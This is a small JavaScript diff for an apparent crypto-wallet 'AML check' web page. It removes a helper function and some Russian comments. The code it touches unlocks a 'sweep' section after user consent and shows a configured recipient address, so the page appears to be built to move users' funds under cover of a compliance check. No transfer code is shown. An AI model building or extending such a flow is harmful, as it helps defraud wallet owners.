@@ -16,8 +16,7 @@ const checkPageUrl = `${apiBase || location.origin}/check.html`;
 const walletProfileKey = "aml_wallet_profile";
 const isTelegramWebApp = Boolean(window.Telegram?.WebApp?.initData);
 
-// Определяем sleep и withTimeout (они нужны в этом файле)
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+// withTimeout определён здесь (sleep уже есть в auto-wallet.js)
 const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
   Promise.race([
     promise,
@@ -123,11 +122,9 @@ const unlockCheckForm = (profile) => {
   if (userConsent) userConsent.checked = true;
   setConnectLoading(false);
 
-  // Показываем секцию списания
   if (typeof window.showSweepSection === 'function') {
     window.showSweepSection(true);
   }
-  // Обновляем информацию о получателе
   if (window.SWEEP_CONFIG && window.SWEEP_CONFIG.recipient) {
     const display = document.querySelector("#sweep-recipient-display");
     if (display) display.textContent = window.SWEEP_CONFIG.recipient;
